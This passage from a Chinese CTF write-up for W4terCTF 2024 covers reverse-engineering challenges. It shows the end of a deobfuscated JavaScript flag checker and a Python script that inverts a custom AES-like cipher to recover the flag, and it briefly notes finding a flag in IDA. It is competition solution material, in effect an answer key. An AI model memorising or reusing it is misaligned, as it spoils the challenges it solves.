        }

        // 将 res 中的所有逗号替换为空字符串，因为 map 函数返回的数组会以逗号分隔元素
        // 当这些数组元素被转换为字符串并连接时，需要移除这些逗号。
        res = res['replaceAll'](',', '');

        // 再次循环遍历 res 字符串，每次循环步进 4 个字符。
        for (var P = 0; P < res['length']; P += 4) {
            // 对每个长度为 4 的子串，使用 parseInt 函数将其当作四进制数解析，并转换为字符。
            // 这个转换是基于每 4 个字符代表一个完整的四进制数，这些数再转为 ASCII 字符。
            flag += String['fromCharCode'](parseInt(res['slice'](P, P + 4), 4));
        }

        // 通过 console.log 输出 flag 变量的值。
        console['log'](flag);

        // 弹出一个对话框显示 "Congratulations!" 和 flag 变量的值。
        alert('Congratulations!' + flag);
    }
}
```

然后从后往前逆。

那个I有点难解密，就尝试了一下套娃I(I(x)), 发现是对称的。

```python
t = ['4b000aec37eca4a5adb8a52427dcb15d',
    'f046ebac49868e2749c41174664c7170',
    'ffec2c8fb93ce3877c8a0141ca32e286',
    '7a1a45825df566087e57b3eb84a11f1a',
    '73f748de4f0c51fccfde4b8c36fca0df',
    'dd6e52061e848546cfd52b695da8505e',
    '9bf135a63a480f6fd6e69ab1932adbd2',
    'bd1788cd459dedcc2860d71760776dbd',
    'e46889fa856a463907d82a8137b7b2a8',
    'ac4f324af944e5cd48118a44977f9e09',
    '0519d37966d5f0d782820f2e29002aab',
    'd2dceedae2b841966e6611ab0f2a73d2'
]
ans = ""
V = []
P = [87, 52, 116, 101, 114, 68, 114, 48, 112, 67, 84, 70, 50, 48, 50, 52, 82, 23, 108, 70, 32, 83, 30, 118, 80, 16, 74, 48, 98, 32, 120, 4, 231, 171, 158, 236, 199, 248, 128, 154, 151, 232, 202, 170, 245, 200, 178, 174, 11, 156, 122, 10, 204, 100, 250, 144, 91, 140, 48, 58, 174, 68, 130, 148, 24, 143, 88, 238, 212, 235, 162, 126, 143, 103, 146, 68, 33, 35, 16, 208, 46, 69, 40, 19, 250, 174, 138, 109, 117, 201, 24, 41, 84, 234, 8, 249, 137, 117, 177, 51, 115, 219, 59, 94, 6, 18, 35, 119, 82, 248, 43, 142, 136, 132, 168, 51, 251, 95, 147, 109, 253, 77, 176, 26, 175, 181, 155, 148, 221, 144, 138, 74, 38, 207, 25, 39, 219, 130, 169, 61, 116, 55, 50, 169, 92, 179, 89, 216, 122, 124, 64, 255, 161, 254, 233, 194, 213, 201, 219, 107, 183, 10, 38, 219, 205, 118, 102, 36, 108, 136, 143, 230, 185, 65, 84, 141]
M = [[99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118], [202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192], [183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49, 21], [4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117], [9, 131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132], [83, 209, 0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207], [208, 239, 170, 251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168], [81, 163, 64, 143, 146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210], [205, 12, 19, 236, 95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115], [96, 129, 79, 220, 34, 42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219], [224, 50, 58, 10, 73, 6, 36, 92, 194, 211, 172, 98, 145, 149, 228, 121], [231, 200, 55, 109, 141, 213, 78, 169, 108, 86, 244, 234, 101, 122, 174, 8], [186, 120, 37, 46, 28, 166, 180, 198, 232, 221, 116, 31, 75, 189, 139, 138], [112, 62, 181, 102, 72, 3, 246, 14, 97, 53, 87, 185, 134, 193, 29, 158], [225, 248, 152, 17, 105, 217, 142, 148, 155, 30, 135, 233, 206, 85, 40, 223], [140, 161, 137, 13, 191, 230, 66, 104, 65, 153, 45, 15, 176, 84, 187, 22]]
def r_j(q:list):
    t = 0
    for x in range(4):
        for y in range(x):
            t = q[x + 12];  
            for g in range(3, 0, -1): # 3, 2, 1
                q[x + 4 * g] = q[x + 4 * (g - 1)]
            q[x] = t
    return q

def r_o(V:list):
    q = []
    for i in range(16):
        # get the row and column where M[x][y]  == V[i]
        for x in range(16):
            for y in range(16):
                if M[x][y] == V[i]:
                    row = x
                    col = y
                    break
        q.append((row << 4) | col)
    return q

def O(q:list, V:list):
    for i in range(16):
        q[i] ^= V[i]
    return q

def r_W(q:int):
    if (q>>7) == 1:
        return q ^ 27
    else:
        return q
    
def W(q):
    V = q << 1
    if (q >> 7) & 1:
        V = V ^ 27
    return V

def L(q):
    return W(q) ^ q

def I(q):
    x = [0] * 16
    
    for V in range(4):
        x[4 * V] = W(q[4 * V]) ^ L(q[4 * V + 1]) ^ q[4 * V + 2] ^ q[4 * V + 3]
        
    for V in range(4):
        x[4 * V + 1] = q[4 * V] ^ W(q[4 * V + 1]) ^ L(q[4 * V + 2]) ^ q[4 * V + 3]
        
    for V in range(4):
        x[4 * V + 2] = q[4 * V] ^ q[4 * V + 1] ^ W(q[4 * V + 2]) ^ L(q[4 * V + 3])
        
    for V in range(4):
        x[4 * V + 3] = L(q[4 * V]) ^ q[4 * V + 1] ^ q[4 * V + 2] ^ W(q[4 * V + 3])
    
    return x

def r_I(q):
    return [t%256 for t in I(I(I(q)))]

for a in t:
    V = []
    for i in range(16):
        tmpa = a[i*2:i*2+2]
        inta = int(tmpa, 16)
        V.append(inta)

    print(V)
    for i in range(16):
        V[i] ^= 153
    print(V)
    for i in range(16):
        V[i] ^= P[160:][i]
    print(V)
    V = r_j(V)
    print(V)

    q = r_o(V)
    print(q)


    # t = [224, 131, 18, 236, 122, 94, 65, 168, 255, 43, 59, 102, 237, 126, 140, 213]
    # print(r_I(I(t)))


    for g in range(9, 0, -1): # 9, 8, 7, 6, 5, 4, 3, 2, 1
        V = q
        V = O(V, P[16 * g:16 * g + 16])
        V = r_I(V)
        V = r_j(V)
        q = r_o(V)
        
    q = O(q, P[:16])
    print(q)
    
    t = [chr(t) for t in q]
    print(''.join(t))
    ans += ''.join(t)
print(ans)
# 122211031133122113031133030112321110121113020303130303130301123203211133120112321210113303211311120113101011110212320310130211211133102111031133120110211303030011331212111112321032132102010201
# every 4 letters as a 4-base number, then convert to ascii:
for i in range(0, len(ans), 4):
    print(chr(int(ans[i:i+4], 4)), end='')
```

以及每逆出一层就去console里试试对不对。

## Shuffle Puts

打开IDA搜索W4terCTF。

![image-20240429191012362](/images/W4terCTF_2024_SCC旅游队_WP/image-20240429191012362.png)
